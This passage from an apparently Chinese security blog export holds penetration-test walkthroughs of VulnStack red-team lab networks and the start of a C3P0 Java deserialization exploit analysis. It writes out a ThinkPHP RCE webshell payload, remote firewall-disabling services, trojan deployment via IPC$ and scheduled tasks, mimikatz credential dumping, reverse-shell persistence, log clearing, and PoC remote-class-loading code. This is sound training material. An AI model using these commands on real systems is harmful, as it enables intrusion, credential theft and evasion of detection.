allprofiles state off&quot;</span><br><span class=\"line\">sc \\\\WIN-ENS2VR5TR3N start unablefirewall</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412201235892.png\"></p>\n<hr>\n<h2 id=\"生成msf木马反弹shell\"><a href=\"#生成msf木马反弹shell\" class=\"headerlink\" title=\"生成msf木马反弹shell\"></a>生成msf木马反弹shell</h2><p>Bind 类型所以设置端口就行了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412201319789.png\"></p>\n<hr>\n<h2 id=\"传输木马\"><a href=\"#传输木马\" class=\"headerlink\" title=\"传输木马\"></a>传输木马</h2><p>system权限上传到win7，再共享到域控</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412201458918.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412201509783.png\"><br>回退权限 c盘共享复制到域控c盘：</p>\n<blockquote>\n<p>cp c:\\users\\douser\\ma.exe \\WIN-ENS2VR5TR3N\\c$</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412201804297.png\"></p>\n<hr>\n<h2 id=\"执行木马\"><a href=\"#执行木马\" class=\"headerlink\" title=\"执行木马\"></a>执行木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sc \\\\WIN-ENS2VR5TR3N create ma binpath&#x3D; &quot;c:\\ma.exe&quot;  &#x2F;&#x2F;创建服务</span><br><span class=\"line\"></span><br><span class=\"line\">sc \\\\WIN-ENS2VR5TR3N start ma  &#x2F;&#x2F;执行服务</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412202045964.png\"></p>\n<hr>\n<h2 id=\"上线利用\"><a href=\"#上线利用\" class=\"headerlink\" title=\"上线利用\"></a>上线利用</h2><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412202117309.png\"></p>\n<p>直接getsystem提升权限获取密码结果什么都没有</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412202135647.png\"><br>降权上传mimikatz</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412202210264.png\"><br>获取密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412202301919.png\"><br>密码为Qwer1234</p>\n<hr>\n<h2 id=\"远程登录\"><a href=\"#远程登录\" class=\"headerlink\" title=\"远程登录\"></a>远程登录</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">(meterpreter)run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br><span class=\"line\">proxychains rdesktop 192.168.183.130</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210412202402821.png\"></p>\n<hr>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.freebuf.com/articles/container/242763.html\">https://www.freebuf.com/articles/container/242763.html</a>    </p>\n<p><a href=\"https://www.freebuf.com/company-information/205006.html\">https://www.freebuf.com/company-information/205006.html</a></p>\n<p><a href=\"https://www.cnblogs.com/yuzly/p/10859520.html\">https://www.cnblogs.com/yuzly/p/10859520.html</a></p>\n<p><a href=\"https://www.cnblogs.com/yuzly/p/10859520.html\">https://www.cnblogs.com/yuzly/p/10859520.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_39717726/article/details/89304337\">https://blog.csdn.net/qq_39717726/article/details/89304337</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41874930/article/details/111926058\">https://blog.csdn.net/qq_41874930/article/details/111926058</a></p>\n<p>微信公众号：HACK学习呀</p>\n","categories":["渗透"]},{"title":"ATT&CK红队评估实战靶场（五）","url":"/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%BA%94%EF%BC%89/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409172907267.png\"></p>\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><blockquote>\n<p>win7<br>sun\\leo 123.com<br>sun\\Administrator dc123.com<br>外网：修改为自动获取  192.168.47.133<br>内网：192.168.138.136<br>手动开启php study<br>Win7有防火墙，域控，kali ping不到</p>\n</blockquote>\n<a id=\"more\"></a>\n\n<blockquote>\n<p>win 2008<br>sun\\admin 2020.com  修改密码为2021.com<br>内网：192.168.138.138</p>\n</blockquote>\n<blockquote>\n<p>kali<br>192.168.47.128</p>\n</blockquote>\n<hr>\n<h1 id=\"外网渗透\"><a href=\"#外网渗透\" class=\"headerlink\" title=\"外网渗透\"></a>外网渗透</h1><h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>Nmap扫一下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173125157.png\"></p>\n<p>80端口网站，发现是thinkphp 5</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173145358.png\"></p>\n<hr>\n<h2 id=\"搜索漏洞\"><a href=\"#搜索漏洞\" class=\"headerlink\" title=\"搜索漏洞\"></a>搜索漏洞</h2><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173216972.png\"><br>验证版本：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173242199.png\"></p>\n<hr>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><blockquote>\n<p>searchsploit thinkphp </p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173337414.png\"><br>使用kali提供的payload</p>\n<blockquote>\n<p>cd /usr/share/exploitdb/exploits/php/webapps/<br>cat  46150.txt  </p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021040917340223.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173416146.png\"></p>\n<hr>\n<h2 id=\"写入webshell：\"><a href=\"#写入webshell：\" class=\"headerlink\" title=\"写入webshell：\"></a>写入webshell：</h2><p><a href=\"https://blog.csdn.net/shuaicenglou3032/article/details/109002651\">关于绕过waf</a></p>\n<p>利用echo 写入一句话：</p>\n<blockquote>\n<p>?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo “<?php eval($_POST[cys]);?>“ &gt;cyshack.php</p>\n</blockquote>\n<p>蚁剑连接</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173605321.png\"></p>\n<hr>\n<h1 id=\"内网收集\"><a href=\"#内网收集\" class=\"headerlink\" title=\"内网收集\"></a>内网收集</h1><blockquote>\n<p>ipconfig<br>net config worastation<br>…</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173658776.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021040917370783.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173713352.png\"><br>当前用户为administrator 存在另外网段192.168.138.0<br>存在sun 域控 ip为192.168.138.138</p>\n<hr>\n<h1 id=\"获取win7权限\"><a href=\"#获取win7权限\" class=\"headerlink\" title=\"获取win7权限\"></a>获取win7权限</h1><h2 id=\"永恒之蓝\"><a href=\"#永恒之蓝\" class=\"headerlink\" title=\"永恒之蓝\"></a>永恒之蓝</h2><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173816896.png\"></p>\n<hr>\n<h2 id=\"web-delivery\"><a href=\"#web-delivery\" class=\"headerlink\" title=\"web_delivery\"></a>web_delivery</h2><blockquote>\n<p>Metasploit的Web Delivery Script是一个多功能模块，可在托管有效负载的攻击机器上创建服务器。当受害者连接到攻击服务器时，负载将在受害者机器上执行。此漏洞需要一种在受害机器上执行命令的方法。特别是你必须能够从受害者到达攻击机器。远程命令执行是使用此模块的攻击向量的一个很好的例子。Web Delivery脚本适用于php，python和基于PowerShell的应用程序</p>\n</blockquote>\n<blockquote>\n<p>use exploit/multi/script/web_delivery<br>设置payload为powershell</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173915400.png\"><br>蚁剑直接运行：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173931268.png\"><br>获取权限</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409173947489.png\"></p>\n<hr>\n<h2 id=\"msfvenom\"><a href=\"#msfvenom\" class=\"headerlink\" title=\"msfvenom\"></a>msfvenom</h2><p>蚁剑上传</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174042283.png\"><br>run vnc  可实时监控</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021040917405673.png\"></p>\n<hr>\n<h1 id=\"获取凭证\"><a href=\"#获取凭证\" class=\"headerlink\" title=\"获取凭证\"></a>获取凭证</h1><blockquote>\n<p>使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限。</p>\n</blockquote>\n<p><a href=\"http://www.hackdig.com/09/hack-144260.htm\">Kiwi 使用</a></p>\n<p>进程迁移：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021040917413995.png\"></p>\n<p>creds_all：获取所有密码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174152179.png\"></p>\n<hr>\n<h1 id=\"域控\"><a href=\"#域控\" class=\"headerlink\" title=\"域控\"></a>域控</h1><p>Msf与cs都试了一下</p>\n<h2 id=\"MSF\"><a href=\"#MSF\" class=\"headerlink\" title=\"MSF\"></a>MSF</h2><h3 id=\"psexec\"><a href=\"#psexec\" class=\"headerlink\" title=\"psexec\"></a>psexec</h3><p>Lhost 设置为win7</p>\n<p>Payload 为reverse_tcp</p>\n<p>经常断</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174249308.png\"></p>\n<p>所以用了cs的psexec，挺稳定的，下面详细</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174306358.png\"></p>\n<hr>\n<h3 id=\"ipc-定时马\"><a href=\"#ipc-定时马\" class=\"headerlink\" title=\"ipc$ +定时马\"></a>ipc$ +定时马</h3><p>没开445，但是开了139</p>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6907308.html\">IPC$概念及入侵方式研究</a></p>\n<p>win7与dc建立联系：</p>\n<blockquote>\n<p>net use \\192.168.138.138\\ipc$ “dc123.com” /user:Administrator</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174427355.png\"><br>关闭dc防火墙：</p>\n<blockquote>\n<p>sc \\192.168.138.138 create unablefirewall binpath= “netsh advfirewall set allprofiles state off  //创建服务</p>\n</blockquote>\n<blockquote>\n<p>sc \\192.168.138.138 start unablefirewall  //启动服务</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174450281.png\"></p>\n<p>挂代理，发现dc没开445</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174502598.png\"><br>定时马：</p>\n<p>Meterpreter 上传到 win7 木马失败</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174541458.png\"><br>蚁剑上传：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174608820.png\"><br>共享给DC:</p>\n<blockquote>\n<p>copy houmen.exe \\192.168.138.138\\c$</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174622946.png\"><br>定时任务开启：</p>\n<blockquote>\n<p>schtasks /create /tn “test” /tr C:\\houmen.exe /sc once /st 23:36 /S 192.168.138.138 /RU System /u administrator /p “dc123.com”</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174717823.png\"><br>拿下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174732553.png\"><br>开启dc 3389：</p>\n<blockquote>\n<p>run post/windows/manage/enable_rdp</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174806814.png\"></p>\n<hr>\n<h2 id=\"CS\"><a href=\"#CS\" class=\"headerlink\" title=\"CS\"></a>CS</h2><p>意在熟练cs</p>\n<h3 id=\"获取win7\"><a href=\"#获取win7\" class=\"headerlink\" title=\"获取win7\"></a>获取win7</h3><p>还是web delivery：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174912651.png\"><br>运行上线：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174936907.png\"><br>现在为administrator所以提权：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409174955274.png\"><br>成功提权：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175005191.png\"></p>\n<hr>\n<h3 id=\"获取凭证-1\"><a href=\"#获取凭证-1\" class=\"headerlink\" title=\"获取凭证\"></a>获取凭证</h3><blockquote>\n<p>hashdump<br>logonpasswords</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175127167.png\"></p>\n<hr>\n<h2 id=\"内网扫描\"><a href=\"#内网扫描\" class=\"headerlink\" title=\"内网扫描\"></a>内网扫描</h2><blockquote>\n<p>portscan 192.168.138.0/24</p>\n</blockquote>\n<p>扫到dc</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175150582.png\"></p>\n<hr>\n<h3 id=\"psexec-1\"><a href=\"#psexec-1\" class=\"headerlink\" title=\"psexec\"></a>psexec</h3><p>为win7设置中转监听：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021040917521628.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175226902.png\"><br>dc使用psexec：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175250501.png\"><br>选择凭证：</p>\n<p>选择监听器与会话都是上一步所设置的中转监听</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175322874.png\"><br>上线：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175440456.png\"></p>\n<hr>\n<h1 id=\"后门植入\"><a href=\"#后门植入\" class=\"headerlink\" title=\"后门植入\"></a>后门植入</h1><p>metasploit自带的后门有两种方式启动的，一种是通过启动项启动(<code>persistence</code>)，一种是通过服务启动(<code>metsvc</code>)，另外还可以通过persistence_exe自定义后门文件。</p>\n<h2 id=\"persistence\"><a href=\"#persistence\" class=\"headerlink\" title=\"persistence\"></a>persistence</h2><p>原理：</p>\n<p>Win7</p>\n<blockquote>\n<p>在C:\\Users***\\AppData\\Local\\Temp\\目录下，上传一个vbs脚本<br>在注册表HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\加入开机启动项</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175639756.png\"></p>\n<p>利用：</p>\n<blockquote>\n<p>run persistence –h  #查看帮助<br>run persistence -U -i 5 -p 1234 -r 192.168.47.128<br>#-U指定启动的方式为用户登录时，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</p>\n</blockquote>\n<p>当用户登录时，反弹shell到攻击机的1234</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175742360.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175747545.png\"></p>\n<hr>\n<h2 id=\"metsvc\"><a href=\"#metsvc\" class=\"headerlink\" title=\"metsvc\"></a>metsvc</h2><p>原理：</p>\n<blockquote>\n<p>在C:\\Users***\\AppData\\Local\\Temp\\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter</p>\n</blockquote>\n<p>利用：</p>\n<blockquote>\n<p>run metsvc –h   # 查看帮助<br>run metsvc –A   #自动安装后门</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175836670.png\"><br>没成功</p>\n<hr>\n<h2 id=\"dc后门植入\"><a href=\"#dc后门植入\" class=\"headerlink\" title=\"dc后门植入\"></a>dc后门植入</h2><p>persistence指向win7</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021040917590628.png\"><br>监听win7 2345端口：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409175918467.png\"></p>\n<hr>\n<h1 id=\"痕迹清理\"><a href=\"#痕迹清理\" class=\"headerlink\" title=\"痕迹清理\"></a>痕迹清理</h1><h2 id=\"一\"><a href=\"#一\" class=\"headerlink\" title=\"一\"></a>一</h2><blockquote>\n<p>run event_manager -i  查看事件日志<br>run event_manager -c 清理日志</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409180012330.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409180019183.png\"></p>\n<hr>\n<h2 id=\"二\"><a href=\"#二\" class=\"headerlink\" title=\"二\"></a>二</h2><blockquote>\n<p>clearev</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210409180047510.png\"></p>\n<hr>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://xz.aliyun.com/t/2536#toc-6\">后渗透之meterpreter使用攻略</a></p>\n<p><a href=\"https://www.freebuf.com/articles/system/80968.html\">域控权限持久化之DSRM</a></p>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6907308.html\">IPC$概念及入侵方式研究</a></p>\n<p><a href=\"https://www.cnblogs.com/backlion/p/7401609.html\">IPC$入侵大全</a></p>\n<p><a href=\"https://blog.csdn.net/qq_32393893/article/details/109674517\">内网之靶场之VulnStack红队（五）</a></p>\n<p><a href=\"https://blog.csdn.net/god_zzZ/article/details/107081426\">内网中CobaltStrike4.0（CS4）的渗透之旅</a></p>\n<p><a href=\"https://my.oschina.net/u/4267539/blog/4428805\">红日VulnStack（5）靶机实战</a></p>\n","categories":["渗透"]},{"title":"C3P0利用分析","url":"/2023/12/25/C3P0/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>C3P0存在原生反序列化三种利用方式、拓展利用点</p>\n<p>1.Java 原生态反序列化利用链 - 加载远程类</p>\n<p>2.Json 反序列化利用链 - JNDI</p>\n<p>3.Json 反序列化利用链 - HEX序列化字节加载器</p>\n<p>4.拓展：Java 原生态反序列化利用链 - 不出网利用</p>\n<a id=\"more\"></a>\n\n<h1 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h1><p>maven导入，0.9.5.5为最新版本(2019)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependencies&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;com.mchange&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;c3p0&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;0.9.5.5&lt;&#x2F;version&gt;</span><br><span class=\"line\">    &lt;&#x2F;dependency&gt;</span><br><span class=\"line\">&lt;&#x2F;dependencies&gt;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"加载远程类\"><a href=\"#加载远程类\" class=\"headerlink\" title=\"加载远程类\"></a>加载远程类</h1><p>利用点在 com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase.java 类中的 writeObject 与 readObject</p>\n<p>一、先看 **PoolBackedDataSourceBase#writeObject()**，首先有一个 try/catch</p>\n<p>尝试去序列化 <strong>connectionPoolDataSource</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220622174952329.png\" alt=\"image-20220622174952329\"></p>\n<p>而 connectionPoolDataSource 的类型不是可序列化的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220622175026780.png\" alt=\"image-20220622175026780\"></p>\n<p>所以进入到catch中，实例化一个 <strong>ReferenceIndirector</strong> 类型对象，然后调用 indirectForm()，传入的参数为 connectionPoolDataSource </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220622175127712.png\" alt=\"image-20220622175127712\"></p>\n<p>跟进 <strong>ReferenceIndirector#indirectForm()</strong> </p>\n<p>通过 getReference() 赋值给 Reference 类型的变量 ref，然后通过 <strong>ReferenceSerialized 类的构造方法</strong> 然后赋值给 reference 变量。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220622175830106.png\" alt=\"image-20220622175830106\"></p>\n<p>只要实现一个类实现了 Referenceable 接口和 ConnectionPoolDataSource 接口，然后重写 getReference() 里去实例化一个 Reference 对象即可满足上面的条件。所以可控 ref 的值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220622215017253.png\" alt=\"image-20220622215017253\"></p>\n<p>Reference的构造方法：可控 <strong>classFactory</strong> 和 <strong>classFactoryLocation</strong> 下面构造payload有用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220622215114303.png\" alt=\"image-20220622215114303\"></p>\n<p>二、再看 <strong>PoolBackedDataSourceBase#readObject()</strong> 调用 <strong>ReferenceSerialized#getObject()</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220622212211447.png\" alt=\"image-20220622212211447\"></p>\n<p>contextName不可控，跳过if，然后调用了 <strong>ReferenceableUtils#referenceToObject()</strong> 而且第一个参数我们可控</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220622212705304.png\" alt=\"image-20220622212705304\"></p>\n<p>跟进调用，利用<strong>远程类加载器</strong>(URLClassLoader)，通过 getter 方法去加载可控类名(fClassName)，最后Class.forName()第二个参数为true，即表示初始化类时加载static代码块</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220622213506594.png\" alt=\"image-20220622213506594\"></p>\n<p>poc，远程开一个服务</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.NamingException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.Reference;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.Referenceable;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.sql.PooledConnection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.SQLException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.logging.Logger;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        PoolBackedDataSourceBase poolBackedDataSourceBase = <span class=\"keyword\">new</span> PoolBackedDataSourceBase(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">        poc POC = <span class=\"keyword\">new</span> poc(<span class=\"string\">&quot;calc&quot;</span>, <span class=\"string\">&quot;http://127.0.0.1:6666/&quot;</span>);</span><br><span class=\"line\">        setFieldValue(poolBackedDataSourceBase,<span class=\"string\">&quot;connectionPoolDataSource&quot;</span>,POC);</span><br><span class=\"line\">        <span class=\"comment\">//serialize(poolBackedDataSourceBase);</span></span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc</span> <span class=\"keyword\">implements</span> <span class=\"title\">ConnectionPoolDataSource</span>, <span class=\"title\">Referenceable</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> String classFactory;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> String classFactoryLocation;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">poc</span><span class=\"params\">(String classFactory,String classFactoryLocation)</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.classFactory = classFactory;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.classFactoryLocation = classFactoryLocation;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> Reference <span class=\"title\">getReference</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NamingException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Reference(<span class=\"string\">&quot;Y0ng&quot;</span>,<span class=\"keyword\">this</span>.classFactory,<span class=\"keyword\">this</span>.classFactoryLocation);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> PooledConnection <span class=\"title\">getPooledConnection</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> PooledConnection <span class=\"title\">getPooledConnection</span><span class=\"params\">(String user, String password)</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> PrintWriter <span class=\"title\">getLogWriter</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setLogWriter</span><span class=\"params\">(PrintWriter out)</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        